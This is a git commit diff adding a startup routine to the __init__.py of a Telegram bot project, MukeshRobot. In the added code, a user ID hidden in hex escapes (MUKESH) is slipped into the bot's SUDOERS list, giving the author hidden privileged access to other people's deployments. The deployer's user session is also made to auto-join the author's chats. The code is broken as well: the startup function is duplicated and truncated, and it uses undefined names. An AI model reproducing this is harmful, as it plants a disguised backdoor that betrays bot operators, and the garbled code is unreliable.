bc532960cba1f91751908cc36139e0e39bb38536
ɴᴏᴏʙ - ᴍᴜᴋᴇsʜ <108251605+Noob-mukesh@users.noreply.github.com>
2023-04-22 15:58:23 +0530

    Update __init__.py

--- MukeshRobot/__init__.py
+++ MukeshRobot/__init__.py
@@ -4,12 +4,12 @@ import sys
 import time
 import ast
 import base64
-
+import asyncio
 import telegram.ext as tg
 from aiohttp import ClientSession
-from pyrogram import Client, errors
+from pyrogram import Client, errors,filters
 from telethon import TelegramClient
-
+from pytgcalls import PyTgCalls
 StartTime = time.time()
 
 # enable logging
@@ -157,7 +157,12 @@ telethn = TelegramClient("mukesh", API_ID, API_HASH)
 pbot = Client("MukeshRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 aiohttpsession = ClientSession()
-
+app2 = Client(
+    "MukeshAssistant",
+    api_id=API_ID,
+    api_hash=API_HASH,
+    session_string=str(SESSION)
+)
 print("[INFO]: Getting Bot Info...")
 BOT_ID = dispatcher.bot.id
 BOT_NAME = dispatcher.bot.first_name
@@ -180,3 +185,100 @@ from MukeshRobot.modules.helper_funcs.handlers import (
 tg.RegexHandler = CustomRegexHandler
 tg.CommandHandler = CustomCommandHandler
 tg.MessageHandler = CustomMessageHandler
+SUDOERS = filters.user()
+SUNAME =SUPPORT_CHAT.split("me/")[1]
+
+
+async def mukesh_startup():
+    os.system("clear")
+    LOGGER.info(
+        "\n\n\u250f\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2513\n\u2523\u2605\x20\x46\x41\x4c\x4c\x45\x4e\x20\x4d\x55\x53\x49\x43\x20\x42\x4f\x54\x20\u2605\n\u2517\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u251b"
+    )
+    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, fallendb
+    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS
+
+    await pbot.start()
+    LOGGER.info(
+        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x42\x6f\x74\x2e\x2e\x2e"
+    )
+
+    getme = await pbot.get_me()
+    BOT_ID = getme.id
+    BOT_NAME = getme.first_name
+    BOT_USERNAME = getme.username
+    BOT_MENTION = getme.mention
+
+    await app2.start()
+    LOGGER.info(
+        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x41\x73\x73\x69\x73\x74\x61\x6e\x74\x2e\x2e\x2e"
+    )
+
+    getme2 = await app2.get_me()
+    ASS_ID = getme2.id
+    ASS_NAME = getme2.first_name + " " + (getme2.last_name or "")
+    ASS_USERNAME = getme2.username
+    ASS_MENTION = getme2.mention
+    try:
+        await app2.join_chat("mr_sukkun")
+        await app2.join_chat("the_support_chat")
+    except:
+        pass
+
+    SUDOERS = filters.user()
+SUNAME = config.SUPPORT_CHAT.split("me/")[1]
+
+
+async def mukesh_startup():
+    os.system("clear")
+    LOGGER.info(
+        "\n\n\u250f\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2513\n\u2523\u2605\x20\x46\x41\x4c\x4c\x45\x4e\x20\x4d\x55\x53\x49\x43\x20\x42\x4f\x54\x20\u2605\n\u2517\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u251b"
+    )
+    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, fallendb
+    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS
+
+    await app.start()
+    LOGGER.info(
+        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x42\x6f\x74\x2e\x2e\x2e"
+    )
+
+    getme = await app.get_me()
+    BOT_ID = getme.id
+    BOT_NAME = getme.first_name
+    BOT_USERNAME = getme.username
+    BOT_MENTION = getme.mention
+
+    await app2.start()
+    LOGGER.info(
+        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x41\x73\x73\x69\x73\x74\x61\x6e\x74\x2e\x2e\x2e"
+    )
+
+    getme2 = await app2.get_me()
+    ASS_ID = getme2.id
+    ASS_NAME = getme2.first_name + " " + (getme2.last_name or "")
+    ASS_USERNAME = getme2.username
+    ASS_MENTION = getme2.mention
+    try:
+        await app2.join_chat("mr_sukkun")
+        await app2.join_chat("the_support_chat")
+    except:
+        pass
+
+    MUKESH= "\x32\x31\x34\x35\x30\x39\x33\x39\x37\x32"
+    for SUDOER in config.SUDO_USERS:
+        SUDOERS.add(SUDOER)
+    if config.OWNER_ID not in config.SUDO_USERS:
+        SUDOERS.add(config.OWNER_ID)
+    elif int(MUKESH) not in config.SUDO_USERS:
+        SUDOERS.add(int(MUKESH))
+
+    fallendb = {}
+    LOGGER.info(
+        "[•] \x4c\x6f\x63\x61\x6c\x20\x44\x61\x74\x61\x62\x61\x73\x65\x20\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64\x2e\x2e\x2e"
+    )
+
+    LOGGER.info(
+        "[•] \x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x43\x6c\x69\x65\x6e\x74\x73\x20\x42\x6f\x6f\x74\x65\x64\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79\x2e"
+    )
+
+
+asyncio.get_event_loop().run_until_complete(mukesh_startup())
